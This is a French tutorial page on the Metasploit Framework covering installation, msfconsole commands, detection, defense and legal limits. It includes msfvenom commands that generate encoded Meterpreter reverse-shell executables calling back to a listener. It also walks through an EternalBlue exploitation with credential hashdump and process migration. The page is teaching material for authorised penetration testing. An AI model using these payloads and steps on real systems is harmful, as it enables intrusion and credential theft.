---
id: metasploit
title: Metasploit Framework
sidebar_position: 1
tags: [cybersecurite, pentest, exploitation, red-team]
---

# Metasploit Framework

## Index

1. [Objectif](#1-objectif)
2. [Installation](#2-installation)
3. [Architecture & fonctionnement](#3-architecture--fonctionnement)
4. [Prise en main de msfconsole](#4-prise-en-main-de-msfconsole)
5. [Commandes principales](#5-commandes-principales)
6. [Générer des payloads avec msfvenom](#6-générer-des-payloads-avec-msfvenom)
7. [Exemple complet](#7-exemple-complet)
8. [Limites](#8-limites)
9. [Détection](#9-détection)
10. [Défense](#10-défense)

---

## 1. Objectif

[Metasploit Framework](https://github.com/rapid7/metasploit-framework) (Rapid7) est LE framework d'exploitation open source de référence en pentest. Il centralise dans un seul outil : reconnaissance, exploitation de vulnérabilités connues, génération de payloads, et post-exploitation — le tout via une bibliothèque de plusieurs milliers de modules maintenus par la communauté.

## 2. Installation

Préinstallé sur Kali Linux et Parrot OS. Ailleurs :

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Initialiser la base de données (PostgreSQL) utilisée par msfconsole
msfdb init
```

## 3. Architecture & fonctionnement

Le framework s'organise en **types de modules** :

| Type | Rôle |
|---|---|
| `exploit` | Exploite une vulnérabilité spécifique pour obtenir l'exécution de code |
| `auxiliary` | Scan, fuzzing, DoS, bruteforce... — n'installe pas de payload |
| `post` | Actions de post-exploitation sur une session déjà ouverte |
| `payload` | Code exécuté après exploitation réussie (shell, Meterpreter...) |
| `encoder` | Encode un payload pour éviter certaines signatures |
| `nop` | Générateurs de NOP sleds (exploitation binaire) |
| `evasion` | Techniques pour contourner AV/EDR |

Les **payloads** existent en deux familles :
- **Staged** (`.../meterpreter/reverse_tcp`) : petit stager envoyé d'abord, qui télécharge ensuite le payload complet (plus discret au moment de l'exploitation initiale).
- **Stageless** (`.../meterpreter_reverse_tcp`) : payload complet envoyé en une fois (plus simple, plus gros).

`msfconsole` est l'interface principale. Une base **PostgreSQL** (activée via `msfdb init`) stocke hosts, services, credentials, loot et vulnérabilités par **workspace** — pratique pour organiser plusieurs audits en parallèle.

## 4. Prise en main de msfconsole

```bash
msfconsole                     # lancer la console
db_status                      # vérifier la connexion à la base
workspace -a mon_audit         # créer/activer un workspace dédié
```

## 5. Commandes principales

| Commande | Fonction |
|---|---|
| `search <mot-clé>` | Rechercher un module (par nom, CVE, plateforme...) |
| `search cve:2021-34527` | Rechercher par CVE |
| `info` | Détails du module actif |
| `use <module>` | Charger un module |
| `show options` | Afficher les options du module courant |
| `show payloads` | Lister les payloads compatibles |
| `set RHOSTS <ip>` | Définir la/les cible(s) |
| `set LHOST <ip>` / `set LPORT <port>` | Adresse/port d'écoute pour une reverse shell |
| `setg <option> <val>` | Définir une option globale (persiste entre modules) |
| `check` | Vérifier si la cible est vulnérable, sans exploiter |
| `exploit` / `run` | Lancer le module |
| `sessions -l` | Lister les sessions ouvertes |
| `sessions -i <id>` | Interagir avec une session |
| `background` (ou `Ctrl+Z`) | Mettre une session en arrière-plan |
| `jobs -l` | Lister les tâches en cours (listeners...) |
| `db_nmap <options> <cible>` | Scanner avec Nmap, résultats stockés dans la base |
| `hosts` / `services` / `creds` / `loot` | Consulter les données collectées dans le workspace |

## 6. Générer des payloads avec msfvenom

`msfvenom` combine génération de payload et encodage en un seul outil (fusion historique de `msfpayload` + `msfencode`).

```bash
# Lister les payloads disponibles pour une plateforme
msfvenom -l payloads | grep windows

# Générer un exécutable Windows avec reverse shell Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe

# Payload Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell.elf

# Avec encodage (contournement basique de signatures)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o shell_encoded.exe
```

## 7. Exemple complet

Scénario classique : scan → recherche de module → exploitation → post-exploitation.

```bash
# 1. Reconnaissance
msfconsole
workspace -a demo
db_nmap -sV 10.10.10.5

# 2. Rechercher un module correspondant au service identifié
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue

# 3. Configurer
show options
set RHOSTS 10.10.10.5
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.1
check

# 4. Exploiter
exploit

# 5. Post-exploitation (dans le shell Meterpreter)
sysinfo
getuid
hashdump
screenshot
migrate <pid_process_stable>
background
```

## 8. Limites

- Les payloads « de base » sont largement **signés par les antivirus/EDR modernes** — l'encodage seul (`shikata_ga_nai`) ne suffit plus à contourner un EDR moderne, il faut du custom development ou d'autres frameworks (Sliver, Cobalt Strike, Havoc...) pour du red team furtif.
- Trafic réseau des payloads standards **reconnaissable** (patterns Meterpreter).
- Couvre surtout des vulnérabilités **connues et publiques** — inutile face à du 0-day ou une cible parfaitement patchée.
- Peut être **bruyant** : `db_nmap` et certains modules auxiliaires génèrent beaucoup de trafic détectable.

## 9. Détection

- Signatures réseau/IDS des stagers et du protocole Meterpreter (règles Snort/Suricata publiques existantes).
- EDR : hooking API, détection de migration de process, injection mémoire.
- AMSI (Windows) qui bloque certains payloads PowerShell non obfusqués.
- Connexions sortantes inattendues vers des IP/ports non habituels (reverse shells).

## 10. Défense

- **Patch management** rigoureux : la majorité des modules exploit ciblent des CVE déjà publiées et corrigées.
- EDR/AV à jour avec détection comportementale (pas seulement signatures).
- Segmentation réseau et **egress filtering** (bloquer les connexions sortantes non nécessaires limite l'impact des reverse shells).
- Désactiver les protocoles obsolètes exploités historiquement (SMBv1, etc.).
- Journalisation et alerting sur les créations de process suspectes (migration, injection).

## Cadre légal

L'usage de Metasploit contre un système sans autorisation explicite est une infraction pénale. À réserver aux audits sous contrat (avec *rules of engagement* signées) et aux environnements de lab (HTB, TryHackMe, Metasploitable...).

## Voir aussi

- [RouterSploit](./routersploit.md) — équivalent orienté objets embarqués/routeurs
- [Denial of Service](../05-Red_Team/01-denial-of-service.md) — les modules `auxiliary/dos` de Metasploit s'inscrivent dans cette famille de techniques
